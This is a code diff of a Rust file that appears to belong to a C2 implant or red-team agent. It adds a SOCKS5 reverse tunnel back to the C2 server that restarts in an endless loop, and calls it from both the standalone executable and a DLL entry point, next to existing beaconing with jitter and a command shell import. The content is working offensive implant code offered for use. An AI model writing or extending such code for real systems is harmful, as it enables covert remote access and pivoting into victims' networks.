@@ -1,19 +1,64 @@
 extern crate tokio;
 extern crate hyper;
 extern crate chrono;
-extern crate uuid;
 
 mod file_handling;
 mod commands;
 mod config;
+mod networking;
 
 use commands::command_shell::run_shell;
 use config::AgentConfig;
+use networking::socks5::Socks5Client;
 use std::env;
-use uuid::Uuid;
+use std::time::Duration;
 
 #[cfg(feature = "dll")]
 use std::os::raw::c_int;
+
+// Start SOCKS5 reverse tunnel in the background
+async fn start_reverse_tunnel(config: AgentConfig) {
+    if !config.socks5_enabled {
+        return;
+    }
+
+    // Extract host and port from server URL
+    let server_url = config.get_server_url();
+    let url_parts: Vec<&str> = server_url.split("://").nth(1)
+        .unwrap_or_default()
+        .split(':')
+        .collect();
+    
+    if url_parts.len() != 2 {
+        println!("[ERROR] Invalid server URL format for SOCKS5 tunnel");
+        return;
+    }
+
+    let proxy_host = url_parts[0].to_string();
+    let proxy_port = url_parts[1].parse::<u16>().unwrap_or(1080);
+    let socks_port = config.socks5_port;
+
+    println!("[SOCKS5] Starting reverse tunnel to {}:{} on local port {}", 
+        proxy_host, proxy_port, socks_port);
+
+    let client = Socks5Client::new(proxy_host.clone(), proxy_port)
+        .with_timeout(Duration::from_secs(30));
+    
+    // Start tunnel in background task
+    tokio::spawn(async move {
+        loop {
+            match client.start_reverse_tunnel(socks_port).await {
+                Ok(_) => {
+                    println!("[SOCKS5] Tunnel closed, restarting...");
+                }
+                Err(e) => {
+                    println!("[ERROR] Reverse tunnel failed: {}. Retrying...", e);
+                    tokio::time::sleep(Duration::from_secs(5)).await;
+                }
+            }
+        }
+    });
+}
 
 // Main entry point for standalone executable
 #[tokio::main]
@@ -30,6 +75,9 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let agent_id = config.payload_id.clone();
     println!("[INFO] Agent ID: {}", agent_id);
     
+    // Start SOCKS5 tunnel if enabled
+    start_reverse_tunnel(config.clone()).await;
+    
     println!("[NETWORK] Attempting connection to C2: {}", server_addr);
     
     loop {
@@ -41,6 +89,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         // Add jitter to reconnection attempts
         let sleep_time = config.sleep_interval + (rand::random::<u64>() % config.jitter);
         tokio::time::sleep(tokio::time::Duration::from_secs(sleep_time)).await;
+        println!("[RETRY] Attempting to reconnect...");
     }
 }
 
@@ -58,6 +107,9 @@ async fn run_agent() -> Result<(), Box<dyn std::error::Error>> {
     // Use payload_id from config
     let agent_id = config.payload_id.clone();
     println!("[INFO] Agent ID: {}", agent_id);
+    
+    // Start SOCKS5 tunnel if enabled
+    start_reverse_tunnel(config.clone()).await;
     
     let server_addr = config.get_server_url();
     println!("[NETWORK] Attempting connection to C2: {}", server_addr);
